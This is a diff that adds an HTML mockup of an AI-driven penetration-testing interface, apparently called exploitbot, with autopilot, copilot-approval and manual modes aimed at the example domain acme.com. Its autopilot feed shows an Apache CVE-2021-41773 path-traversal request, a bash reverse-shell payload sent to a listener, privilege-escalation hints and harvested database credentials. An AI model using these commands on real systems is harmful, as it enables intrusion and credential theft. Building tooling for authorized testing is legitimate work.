@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>exploitbot — P4: Interaction Modes Mockup</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    :root {
+      --bg-deep: #050507; --bg-base: #09090b; --bg-raised: #111114;
+      --bg-surface: #1c1c21; --bg-input: #0f0f12;
+      --border-subtle: #1e1e23; --border-medium: #2a2a32; --border-strong: #3f3f46;
+      --text-primary: #f4f4f5; --text-secondary: #a1a1aa; --text-muted: #71717a;
+      --text-subtle: #52525b; --text-dim: #3f3f46;
+      --accent-red: #ef4444; --accent-blue: #3b82f6; --accent-orange: #f97316;
+      --accent-cyan: #06b6d4; --accent-amber: #f59e0b; --accent-purple: #a855f7;
+      --accent-green: #22c55e;
+      --font-sans: 'Inter', -apple-system, sans-serif;
+      --font-mono: 'JetBrains Mono', 'SF Mono', monospace;
+    }
+    body { font-family: var(--font-sans); background: var(--bg-deep); color: var(--text-primary); height: 100vh; overflow: hidden; -webkit-font-smoothing: antialiased; font-size: 13px; }
+    .phase-label { position: fixed; top: 8px; right: 16px; font-family: var(--font-mono); font-size: 10px; color: var(--text-dim); background: var(--bg-surface); padding: 3px 8px; border-radius: 4px; z-index: 99; }
+    .app { display: flex; flex-direction: column; height: 100vh; }
+    .titlebar { height: 28px; background: var(--bg-raised); border-bottom: 1px solid var(--border-subtle); display: flex; align-items: center; padding: 0 12px; flex-shrink: 0; }
+    .tl-group { display: flex; gap: 8px; }
+    .tl { width: 12px; height: 12px; border-radius: 50%; }
+    .tl.r { background: #ff5f57; } .tl.y { background: #febc2e; } .tl.g { background: #28c840; }
+    .titlebar-t { flex: 1; text-align: center; font-size: 12px; color: var(--text-muted); font-weight: 500; }
+    .tab-bar { height: 36px; display: flex; align-items: center; padding: 0 12px; gap: 2px; background: var(--bg-base); border-bottom: 1px solid var(--border-subtle); flex-shrink: 0; }
+    .tab { padding: 6px 14px; font-size: 11px; font-family: var(--font-mono); font-weight: 500; color: var(--text-muted); border-radius: 6px; cursor: pointer; white-space: nowrap; position: relative; transition: all 0.15s; border: none; background: transparent; }
+    .tab:hover { color: var(--text-secondary); background: rgba(255,255,255,0.03); }
+    .tab.active { color: var(--text-primary); background: var(--bg-surface); }
+    .tab.active::after { content: ''; position: absolute; bottom: -1px; left: 8px; right: 8px; height: 2px; border-radius: 1px; }
+    .main { flex: 1; overflow: hidden; }
+    .panel-screen { display: none; height: 100%; }
+    .panel-screen.active { display: flex; flex-direction: column; }
+    .mono { font-family: var(--font-mono); }
+    .dim { color: var(--text-dim); }
+    .muted { color: var(--text-muted); }
+    .sec { color: var(--text-secondary); }
+    .sm { font-size: 11px; }
+    .xs { font-size: 10px; }
+    .badge { display: inline-block; padding: 1px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; font-family: var(--font-mono); }
+    .badge.crit { background: rgba(239,68,68,0.15); color: var(--accent-red); }
+    .badge.high { background: rgba(249,115,22,0.15); color: var(--accent-orange); }
+    .badge.success { background: rgba(34,197,94,0.15); color: var(--accent-green); }
+    .tag { font-family: var(--font-mono); font-size: 10px; padding: 2px 7px; border-radius: 4px; background: var(--bg-surface); color: var(--text-muted); display: inline-block; }
+    .vuln-act { font-size: 10px; font-family: var(--font-mono); padding: 3px 8px; border-radius: 4px; border: 1px solid var(--border-subtle); background: transparent; color: var(--text-muted); cursor: pointer; }
+    .vuln-act:hover { border-color: var(--border-medium); color: var(--text-primary); }
+
+    /* FEED */
+    .feed { flex: 1; overflow-y: auto; padding: 0; }
+    .feed-entry { display: flex; gap: 10px; padding: 6px 20px; border-bottom: 1px solid var(--border-subtle); font-size: 12px; line-height: 1.5; }
+    .feed-entry:hover { background: rgba(255,255,255,0.01); }
+    .feed-time { font-family: var(--font-mono); font-size: 10px; color: var(--text-dim); width: 44px; flex-shrink: 0; padding-top: 2px; }
+    .feed-icon { width: 18px; flex-shrink: 0; text-align: center; padding-top: 1px; }
+    .feed-body { flex: 1; min-width: 0; }
+    .feed-tool { color: var(--accent-cyan); font-family: var(--font-mono); font-weight: 600; font-size: 11px; }
+    .feed-success { color: var(--accent-green); }
+    .feed-warning { color: var(--accent-amber); }
+    .feed-error { color: var(--accent-red); }
+    .feed-decision { color: var(--accent-purple); }
+    .feed-finding { color: var(--accent-green); font-weight: 600; }
+    .feed-cmd { font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); background: var(--bg-surface); padding: 2px 8px; border-radius: 4px; display: inline-block; margin-top: 2px; }
+    .feed-output { font-family: var(--font-mono); font-size: 10px; color: var(--text-dim); margin-top: 4px; padding: 6px 10px; background: var(--bg-input); border-radius: 4px; border: 1px solid var(--border-subtle); max-height: 80px; overflow-y: auto; white-space: pre-wrap; }
+    .feed-thinking { color: var(--accent-purple); font-style: italic; font-size: 11px; background: rgba(168,85,247,0.05); padding: 6px 10px; border-radius: 4px; border: 1px solid rgba(168,85,247,0.1); margin-top: 2px; }
+    .feed-section { padding: 8px 20px; background: var(--bg-raised); border-bottom: 1px solid var(--border-subtle); font-family: var(--font-mono); font-size: 10px; color: var(--text-dim); letter-spacing: 1px; text-transform: uppercase; position: sticky; top: 0; z-index: 5; }
+
+    /* STATUS BAR */
+    .status-bar { height: 32px; display: flex; align-items: center; padding: 0 20px; gap: 16px; background: var(--bg-raised); border-top: 1px solid var(--border-subtle); flex-shrink: 0; }
+    .status-item { font-family: var(--font-mono); font-size: 10px; color: var(--text-dim); display: flex; align-items: center; gap: 4px; }
+    .status-dot { width: 6px; height: 6px; border-radius: 50%; }
+    .status-dot.green { background: var(--accent-green); box-shadow: 0 0 6px rgba(34,197,94,0.4); }
+    .status-dot.amber { background: var(--accent-amber); }
+    .status-spacer { flex: 1; }
+
+    /* CONTROLS */
+    .controls-bar { height: 50px; display: flex; align-items: center; padding: 0 20px; gap: 10px; background: var(--bg-base); border-bottom: 1px solid var(--border-subtle); flex-shrink: 0; }
+    .mode-badge { font-family: var(--font-mono); font-size: 11px; font-weight: 700; padding: 4px 12px; border-radius: 6px; letter-spacing: 0.5px; }
+    .mode-badge.autopilot { background: rgba(34,197,94,0.15); color: var(--accent-green); border: 1px solid rgba(34,197,94,0.3); }
+    .mode-badge.copilot { background: rgba(59,130,246,0.15); color: var(--accent-blue); border: 1px solid rgba(59,130,246,0.3); }
+    .mode-badge.manual { background: rgba(113,113,122,0.15); color: var(--text-muted); border: 1px solid var(--border-medium); }
+    .ctrl-btn { height: 30px; padding: 0 14px; border-radius: 6px; font-family: var(--font-mono); font-size: 11px; font-weight: 600; cursor: pointer; border: 1px solid var(--border-subtle); background: transparent; color: var(--text-muted); display: flex; align-items: center; gap: 6px; }
+    .ctrl-btn:hover { border-color: var(--border-medium); color: var(--text-primary); }
+    .ctrl-btn.danger { border-color: rgba(239,68,68,0.3); color: var(--accent-red); }
+    .ctrl-btn.danger:hover { background: rgba(239,68,68,0.1); }
+    .ctrl-btn.primary { background: var(--text-primary); color: var(--bg-deep); border: none; }
+    .phase-indicator { font-size: 12px; color: var(--text-secondary); font-weight: 500; }
+    .phase-indicator .phase-sub { font-size: 10px; color: var(--text-dim); font-weight: 400; }
+
+    /* COPILOT APPROVAL */
+    .approval-card { margin: 8px 20px; background: var(--bg-raised); border: 1px solid rgba(59,130,246,0.3); border-radius: 10px; padding: 14px 16px; }
+    .approval-header { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; }
+    .approval-icon { font-size: 16px; }
+    .approval-title { font-size: 12px; font-weight: 600; color: var(--accent-blue); }
+    .approval-desc { font-size: 12px; color: var(--text-secondary); margin-bottom: 8px; line-height: 1.4; }
+    .approval-cmd { font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); background: var(--bg-input); padding: 8px 10px; border-radius: 6px; border: 1px solid var(--border-subtle); margin-bottom: 10px; }
+    .approval-params { margin-bottom: 10px; }
+    .approval-param { display: flex; gap: 8px; align-items: center; margin-bottom: 4px; }
+    .approval-param-name { font-family: var(--font-mono); font-size: 10px; color: var(--text-dim); width: 80px; }
+    .approval-param-val { font-family: var(--font-mono); font-size: 11px; color: var(--text-secondary); }
+    .approval-param-edit { font-family: var(--font-mono); font-size: 11px; color: var(--text-primary); background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 4px; padding: 2px 6px; outline: none; }
+    .approval-actions { display: flex; gap: 8px; }
+    .approval-btn { padding: 6px 16px; border-radius: 6px; font-size: 11px; font-weight: 600; cursor: pointer; border: none; font-family: var(--font-mono); }
+    .approval-btn.approve { background: var(--accent-green); color: white; }
+    .approval-btn.approve:hover { filter: brightness(1.1); }
+    .approval-btn.modify { background: var(--bg-surface); color: var(--text-secondary); border: 1px solid var(--border-medium); }
+    .approval-btn.reject { background: transparent; color: var(--accent-red); border: 1px solid rgba(239,68,68,0.3); }
+
+    /* MANUAL CHAT */
+    .manual-chat { flex: 1; display: flex; flex-direction: column; }
+    .manual-messages { flex: 1; overflow-y: auto; padding: 16px 20px; display: flex; flex-direction: column; gap: 12px; }
+    .msg { max-width: 80%; padding: 10px 14px; border-radius: 12px; font-size: 12px; line-height: 1.5; }
+    .msg.user { align-self: flex-end; background: var(--bg-surface); color: var(--text-primary); border-bottom-right-radius: 4px; }
+    .msg.assistant { align-self: flex-start; background: var(--bg-input); color: var(--text-secondary); border-bottom-left-radius: 4px; border: 1px solid var(--border-subtle); }
+    .msg code { font-family: var(--font-mono); font-size: 11px; background: rgba(255,255,255,0.06); padding: 1px 5px; border-radius: 3px; }
+    .msg strong { color: var(--text-primary); }
+    .manual-input { padding: 12px 20px; border-top: 1px solid var(--border-subtle); display: flex; gap: 8px; align-items: flex-end; }
+    .manual-textarea { flex: 1; min-height: 36px; background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 10px; padding: 8px 12px; color: var(--text-primary); font-size: 12px; resize: none; outline: none; font-family: var(--font-sans); }
+    .manual-textarea::placeholder { color: var(--text-dim); }
+    .manual-send { width: 36px; height: 36px; border-radius: 10px; background: var(--text-primary); color: var(--bg-deep); border: none; cursor: pointer; font-size: 16px; flex-shrink: 0; }
+
+    /* TOOL PANEL (side by side with chat in manual) */
+    .manual-layout { flex: 1; display: flex; overflow: hidden; }
+    .manual-tools { flex: 1; border-right: 1px solid var(--border-subtle); overflow-y: auto; padding: 16px; }
+    .manual-chat-panel { width: 380px; display: flex; flex-direction: column; }
+    .tool-form-group { margin-bottom: 12px; }
+    .tool-form-label { font-family: var(--font-mono); font-size: 10px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 4px; }
+    .tool-form-input { width: 100%; height: 30px; background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 6px; padding: 0 10px; color: var(--text-primary); font-family: var(--font-mono); font-size: 12px; outline: none; }
+    .tool-form-select { width: 100%; height: 30px; background: var(--bg-input); border: 1px solid var(--border-subtle); border-radius: 6px; padding: 0 10px; color: var(--text-primary); font-family: var(--font-mono); font-size: 12px; outline: none; }
+    .run-btn { width: 100%; height: 34px; background: var(--accent-blue); color: white; border: none; border-radius: 8px; font-family: var(--font-mono); font-size: 12px; font-weight: 600; cursor: pointer; margin-top: 8px; }
+
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: var(--border-subtle); border-radius: 3px; }
+  </style>
+</head>
+<body>
+
+<div class="phase-label">P4: Interaction Modes</div>
+
+<div class="app">
+  <div class="titlebar">
+    <div class="tl-group"><div class="tl r"></div><div class="tl y"></div><div class="tl g"></div></div>
+    <div class="titlebar-t">exploitbot — Acme Corp External</div>
+  </div>
+
+  <div class="tab-bar">
+    <div class="tab" onclick="showTab('autopilot')" id="tab-autopilot">Autopilot</div>
+    <div class="tab" onclick="showTab('copilot')" id="tab-copilot">Copilot</div>
+    <div class="tab" onclick="showTab('manual')" id="tab-manual">Manual</div>
+  </div>
+
+  <div class="main">
+
+    <!-- ═══════════ AUTOPILOT MODE ═══════════ -->
+    <div class="panel-screen" id="panel-autopilot">
+      <div class="controls-bar">
+        <div class="mode-badge autopilot">🤖 AUTOPILOT</div>
+        <div class="phase-indicator">Exploitation Phase <span class="phase-sub">· 14 tools run · 23 findings</span></div>
+        <div style="flex:1"></div>
+        <button class="ctrl-btn">⏸ Pause</button>
+        <button class="ctrl-btn danger">⏹ Stop</button>
+      </div>
+
+      <div class="feed">
+        <div class="feed-section">Phase 1 — Reconnaissance (14:23 – 14:25)</div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:23</div>
+          <div class="feed-icon">💭</div>
+          <div class="feed-body">
+            <div class="feed-thinking">Starting external assessment of acme.com. Will begin with passive subdomain enumeration, then resolve DNS, probe live hosts, and identify tech stacks. Priority: find exposed services with known CVEs.</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:23</div>
+          <div class="feed-icon" style="color:var(--accent-cyan)">▶</div>
+          <div class="feed-body">
+            <span class="sec">Running</span> <span class="feed-tool">subfinder</span>
+            <div class="feed-cmd">subfinder -d acme.com -silent</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:23</div>
+          <div class="feed-icon feed-success">✓</div>
+          <div class="feed-body">
+            <span class="feed-success">subfinder complete</span> <span class="muted">— 47 subdomains found (12.3s)</span>
+            <div class="feed-output">dev.acme.com
+staging.acme.com
+api.acme.com
+mail.acme.com
+vpn.acme.com
+jenkins.acme.com
+grafana.acme.com
+old.acme.com
+... 39 more</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:23</div>
+          <div class="feed-icon" style="color:var(--accent-cyan)">▶</div>
+          <div class="feed-body">
+            <span class="sec">Piping to</span> <span class="feed-tool">dnsx</span> <span class="muted">+ </span><span class="feed-tool">httpx</span>
+            <div class="feed-cmd">cat subs.txt | dnsx -resp -silent | httpx -sc -title -tech-detect -json</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:24</div>
+          <div class="feed-icon feed-success">✓</div>
+          <div class="feed-body"><span class="feed-success">httpx complete</span> <span class="muted">— 12 live web hosts (8.7s)</span></div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:24</div>
+          <div class="feed-icon">💭</div>
+          <div class="feed-body">
+            <div class="feed-thinking">Interesting — dev.acme.com running Apache/2.4.49 (known CVE-2021-41773). jenkins.acme.com exposed with Jetty/9.4. old.acme.com running ancient Apache/2.2.15. Prioritizing dev.acme.com for vulnerability scanning due to known critical CVE.</div>
+          </div>
+        </div>
+
+        <div class="feed-section">Phase 2 — Vulnerability Scanning (14:25 – 14:28)</div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:25</div>
+          <div class="feed-icon" style="color:var(--accent-cyan)">▶</div>
+          <div class="feed-body">
+            <span class="sec">Running</span> <span class="feed-tool">nuclei</span> <span class="muted">against 12 hosts</span>
+            <div class="feed-cmd">nuclei -l live_hosts.txt -severity critical,high -jsonl -silent</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:25</div>
+          <div class="feed-icon feed-warning">⚠</div>
+          <div class="feed-body">
+            <span class="feed-warning">CRITICAL</span> <span class="sec">CVE-2021-41773 confirmed on</span> <span style="color:var(--accent-cyan)">dev.acme.com</span>
+            <span class="muted sm">— Apache Path Traversal + RCE (CVSS 9.8)</span>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:25</div>
+          <div class="feed-icon" style="color:var(--accent-green)">★</div>
+          <div class="feed-body">
+            <span class="feed-finding">Finding #1 created: CVE-2021-41773 — Apache Path Traversal + RCE</span>
+            <span class="muted sm">· Critical · CVSS 9.8 · dev.acme.com</span>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:26</div>
+          <div class="feed-icon feed-warning">⚠</div>
+          <div class="feed-body">
+            <span class="feed-warning">CRITICAL</span> <span class="sec">Unauthenticated Jenkins on</span> <span style="color:var(--accent-cyan)">jenkins.acme.com</span>
+            <span class="muted sm">— Script Console RCE (CVSS 9.1)</span>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:26</div>
+          <div class="feed-icon" style="color:var(--accent-green)">★</div>
+          <div class="feed-body"><span class="feed-finding">Finding #2 created: Jenkins Unauthenticated RCE</span> <span class="muted sm">· Critical · CVSS 9.1</span></div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:26</div>
+          <div class="feed-icon" style="color:var(--accent-cyan)">▶</div>
+          <div class="feed-body">
+            <span class="sec">Running</span> <span class="feed-tool">sqlmap</span> <span class="muted">against old.acme.com</span>
+            <div class="feed-cmd">sqlmap -u "https://old.acme.com/login.php?user=admin" --batch --level 3 --risk 2</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:27</div>
+          <div class="feed-icon feed-warning">⚠</div>
+          <div class="feed-body">
+            <span class="feed-warning">HIGH</span> <span class="sec">SQL Injection (boolean blind) on</span> <span style="color:var(--accent-cyan)">old.acme.com</span>
+            <span class="muted sm">— MySQL 5.7, user parameter (CVSS 7.2)</span>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:27</div>
+          <div class="feed-icon" style="color:var(--accent-green)">★</div>
+          <div class="feed-body"><span class="feed-finding">Finding #4 created: SQL Injection — login parameter</span> <span class="muted sm">· High · CVSS 7.2</span></div>
+        </div>
+
+        <div class="feed-section">Phase 3 — Exploitation (14:28 – 14:35)</div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:28</div>
+          <div class="feed-icon">💭</div>
+          <div class="feed-body">
+            <div class="feed-thinking">CVE-2021-41773 on dev.acme.com is the highest-value target. Attempting exploitation via path traversal to confirm RCE and establish a shell. Will try reading /etc/passwd first, then CGI-bin execution.</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:28</div>
+          <div class="feed-icon" style="color:var(--accent-cyan)">▶</div>
+          <div class="feed-body">
+            <span class="sec">Running</span> <span class="feed-tool">run_shell</span>
+            <div class="feed-cmd">curl -s --path-as-is "https://dev.acme.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:28</div>
+          <div class="feed-icon feed-success">✓</div>
+          <div class="feed-body">
+            <span class="feed-success">RCE confirmed</span> <span class="muted">— /etc/passwd readable</span>
+            <div class="feed-output">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+acme-app:x:1000:1000::/home/acme-app:/bin/bash</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:29</div>
+          <div class="feed-icon" style="color:var(--accent-cyan)">▶</div>
+          <div class="feed-body">
+            <span class="sec">Starting</span> <span class="feed-tool">pwncat</span> <span class="muted">listener on :4444</span>
+            <div class="feed-cmd">pwncat-cs -lp 4444 --platform linux</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:29</div>
+          <div class="feed-icon" style="color:var(--accent-cyan)">▶</div>
+          <div class="feed-body">
+            <span class="sec">Sending reverse shell payload via CGI</span>
+            <div class="feed-cmd">curl --path-as-is "https://dev.acme.com/cgi-bin/.%2e/.%2e/bin/bash" -d 'bash -i >& /dev/tcp/10.0.0.100/4444 0>&1'</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:29</div>
+          <div class="feed-icon feed-success">✓</div>
+          <div class="feed-body">
+            <span class="feed-success" style="font-weight:700">Shell established!</span> <span class="muted">www-data@dev.acme.com → 10.0.0.100:4444</span>
+            <div style="margin-top:4px"><span class="badge success">Session 1 active</span></div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:30</div>
+          <div class="feed-icon">📦</div>
+          <div class="feed-body"><span class="muted">Stashed: reverse shell payload, /etc/passwd contents, session details</span></div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:30</div>
+          <div class="feed-icon">💭</div>
+          <div class="feed-body">
+            <div class="feed-thinking">Shell as www-data. Running LinPEAS for privilege escalation enumeration. Also checking for credentials in web application config files.</div>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:30</div>
+          <div class="feed-icon" style="color:var(--accent-cyan)">▶</div>
+          <div class="feed-body">
+            <span class="sec">Running</span> <span class="feed-tool">linpeas</span> <span class="muted">on Session 1 (dev.acme.com)</span>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:33</div>
+          <div class="feed-icon feed-warning">⚠</div>
+          <div class="feed-body">
+            <span class="feed-warning">HIGH</span> <span class="sec">SUID pkexec (CVE-2021-4034 PwnKit) — instant root</span>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:33</div>
+          <div class="feed-icon feed-warning">⚠</div>
+          <div class="feed-body">
+            <span class="feed-warning">HIGH</span> <span class="sec">MySQL credentials found:</span> <span style="color:var(--accent-amber)">root:Acm3_Pr0d_2024!</span> <span class="muted">in /var/www/.env</span>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:33</div>
+          <div class="feed-icon">📦</div>
+          <div class="feed-body"><span class="muted">Stashed credentials: root:Acm3_Pr0d_2024! (MySQL, from .env)</span></div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:35</div>
+          <div class="feed-icon">💭</div>
+          <div class="feed-body">
+            <div class="feed-thinking">Found 23 vulnerabilities total (2 critical, 5 high, 12 medium, 8 low). Successfully established RCE on dev.acme.com, discovered privilege escalation paths and database credentials. Assessment is comprehensive. Preparing to generate report.</div>
+          </div>
+        </div>
+
+        <div class="feed-entry" style="background:rgba(34,197,94,0.03)">
+          <div class="feed-time">14:35</div>
+          <div class="feed-icon" style="font-size:14px">📊</div>
+          <div class="feed-body">
+            <span class="feed-finding">Assessment complete — 23 findings. Generating pentest report...</span>
+            <div style="margin-top:6px;display:flex;gap:6px">
+              <button class="vuln-act" style="border-color:rgba(34,197,94,0.3);color:var(--accent-green)">📄 View Report</button>
+              <button class="vuln-act">📦 View Stash (14 items)</button>
+              <button class="vuln-act">⬇ Export PDF</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="status-bar">
+        <div class="status-item"><div class="status-dot green"></div> Autopilot running</div>
+        <div class="status-item">Qwen 3.5 397B</div>
+        <div class="status-item">127K tokens</div>
+        <div class="status-item">14 tools run</div>
+        <div class="status-item">23 findings</div>
+        <div class="status-spacer"></div>
+        <div class="status-item">Session 1: www-data@dev.acme.com</div>
+      </div>
+    </div>
+
+    <!-- ═══════════ COPILOT MODE ═══════════ -->
+    <div class="panel-screen" id="panel-copilot">
+      <div class="controls-bar">
+        <div class="mode-badge copilot">🤝 COPILOT</div>
+        <div class="phase-indicator">Recon Phase <span class="phase-sub">· 2 tools run · 0 findings</span></div>
+        <div style="flex:1"></div>
+        <button class="ctrl-btn">Switch to Autopilot</button>
+      </div>
+
+      <div class="feed" style="flex:1;overflow-y:auto">
+        <div class="feed-entry">
+          <div class="feed-time">14:23</div>
+          <div class="feed-icon">💭</div>
+          <div class="feed-body">
+            <div class="feed-thinking">I'll start with subdomain enumeration for acme.com. This is non-invasive — passive data collection only.</div>
+          </div>
+        </div>
+
+        <div class="approval-card">
+          <div class="approval-header">
+            <div class="approval-icon">🔧</div>
+            <div class="approval-title">Tool Request: subfinder</div>
+            <span class="tag" style="margin-left:auto;color:var(--accent-green)">safe · passive</span>
+          </div>
+          <div class="approval-desc">Enumerate subdomains for acme.com using passive sources (certificate transparency, search engines, DNS datasets). This does NOT touch the target directly.</div>
+          <div class="approval-cmd">subfinder -d acme.com -silent</div>
+          <div class="approval-params">
+            <div class="approval-param"><span class="approval-param-name">domain:</span><input class="approval-param-edit" value="acme.com"></div>
+            <div class="approval-param"><span class="approval-param-name">recursive:</span><span class="approval-param-val">false</span></div>
+          </div>
+          <div class="approval-actions">
+            <button class="approval-btn approve">✓ Approve</button>
+            <button class="approval-btn modify">✎ Modify</button>
+            <button class="approval-btn reject">✕ Reject</button>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:23</div>
+          <div class="feed-icon feed-success">✓</div>
+          <div class="feed-body"><span class="feed-success">subfinder complete</span> <span class="muted">— 47 subdomains found (12.3s)</span></div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:24</div>
+          <div class="feed-icon">💭</div>
+          <div class="feed-body">
+            <div class="feed-thinking">Good results. Now I want to resolve these subdomains and probe for live web hosts. I'll chain dnsx and httpx. Both are safe — just DNS queries and HTTP requests.</div>
+          </div>
+        </div>
+
+        <div class="approval-card">
+          <div class="approval-header">
+            <div class="approval-icon">🔧</div>
+            <div class="approval-title">Tool Chain: dnsx → httpx</div>
+            <span class="tag" style="margin-left:auto;color:var(--accent-green)">safe · active recon</span>
+          </div>
+          <div class="approval-desc">Resolve subdomains via DNS, then probe live hosts for HTTP status codes, titles, and technologies. Sends HTTP requests to each discovered host.</div>
+          <div class="approval-cmd">cat subs.txt | dnsx -resp -silent | httpx -sc -title -tech-detect -json</div>
+          <div class="approval-actions">
+            <button class="approval-btn approve">✓ Approve</button>
+            <button class="approval-btn modify">✎ Modify</button>
+            <button class="approval-btn reject">✕ Reject</button>
+          </div>
+        </div>
+
+        <div class="feed-entry">
+          <div class="feed-time">14:24</div>
+          <div class="feed-icon feed-success">✓</div>
+          <div class="feed-body"><span class="feed-success">Chain complete</span> <span class="muted">— 42 resolved, 12 live web hosts</span></div>
+        </div>
+
+        <div class="approval-card" style="border-color:rgba(239,68,68,0.3)">
+          <div class="approval-header">
+            <div class="approval-icon">⚠️</div>
+            <div class="approval-title" style="color:var(--accent-red)">Tool Request: nuclei (vulnerability scan)</div>
+            <span class="tag" style="margin-left:auto;color:var(--accent-amber)">active · sends payloads</span>
+          </div>
+          <div class="approval-desc">Run vulnerability scanner against 12 live hosts. This <strong style="color:var(--text-primary)">actively probes targets</strong> with 8,247 templates including SQL injection, XSS, and RCE checks. Some templates may trigger WAF alerts or IDS.</div>
+          <div class="approval-cmd">nuclei -l live_hosts.txt -severity critical,high -jsonl -silent</div>
+          <div class="approval-params">
+            <div class="approval-param"><span class="approval-param-name">targets:</span><span class="approval-param-val">12 hosts (from httpx)</span></div>
+            <div class="approval-param"><span class="approval-param-name">severity:</span><input class="approval-param-edit" value="critical,high"></div>
+            <div class="approval-param"><span class="approval-param-name">rate_limit:</span><input class="approval-param-edit" value="150"></div>
+            <div class="approval-param"><span class="approval-param-name">interactsh:</span><span class="approval-param-val">true (OOB detection)</span></div>
+          </div>
+          <div class="approval-actions">
+            <button class="approval-btn approve">✓ Approve</button>
+            <button class="approval-btn modify">✎ Modify</button>
+            <button class="approval-btn reject">✕ Reject</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="status-bar">
+        <div class="status-item"><div class="status-dot" style="background:var(--accent-blue);box-shadow:0 0 6px rgba(59,130,246,0.4)"></div> Copilot · awaiting approval</div>
+        <div class="status-item">Qwen 3 235B</div>
+        <div class="status-item">12K tokens</div>
+        <div class="status-spacer"></div>
+        <div class="status-item">1 pending approval</div>
+      </div>
+    </div>
+
+    <!-- ═══════════ MANUAL MODE ═══════════ -->
+    <div class="panel-screen" id="panel-manual">
+      <div class="controls-bar">
+        <div class="mode-badge manual">🎯 MANUAL</div>
+        <div class="phase-indicator">Recon Tab <span class="phase-sub">· nmap</span></div>
+        <div style="flex:1"></div>
+        <button class="ctrl-btn">Switch to Copilot</button>
+      </div>
+
+      <div class="manual-layout">
+        <div class="manual-tools">
+          <div style="font-size:14px;font-weight:600;margin-bottom:14px">nmap — Port Scanner</div>
+
+          <div class="tool-form-group">
+            <div class="tool-form-label">Target</div>
+            <input class="tool-form-input" value="dev.acme.com">
+          </div>
+          <div style="display:flex;gap:8px">
+            <div class="tool-form-group" style="flex:1">
+              <div class="tool-form-label">Scan Type</div>
+              <select class="tool-form-select"><option selected>SYN (-sS)</option><option>Connect (-sT)</option><option>UDP (-sU)</option><option>Ping (-sn)</option></select>
+            </div>
+            <div class="tool-form-group" style="flex:1">
+              <div class="tool-form-label">Timing</div>
+              <select class="tool-form-select"><option>T1 (sneaky)</option><option>T2 (polite)</option><option selected>T3 (normal)</option><option>T4 (aggressive)</option></select>
+            </div>
+          </div>
+          <div class="tool-form-group">
+            <div class="tool-form-label">Ports</div>
+            <input class="tool-form-input" placeholder="80,443 or 1-1000 or - for all" value="1-10000">
+          </div>
+          <div style="display:flex;gap:8px">
+            <div class="tool-form-group" style="flex:1">
+              <div class="tool-form-label">Service Detection</div>
+              <select class="tool-form-select"><option selected>Yes (-sV)</option><option>No</option></select>
+            </div>
+            <div class="tool-form-group" style="flex:1">
+              <div class="tool-form-label">OS Detection</div>
+              <select class="tool-form-select"><option>Yes (-O)</option><option selected>No</option></select>
+            </div>
+          </div>
+          <div class="tool-form-group">
+            <div class="tool-form-label">NSE Scripts</div>
+            <input class="tool-form-input" placeholder="vuln, default, http-enum, smb-*" value="">
+          </div>
+
+          <button class="run-btn">▶ Run nmap</button>
+
+          <div style="margin-top:16px;font-family:var(--font-mono);font-size:10px;color:var(--text-dim)">
+            COMMAND PREVIEW
+          </div>
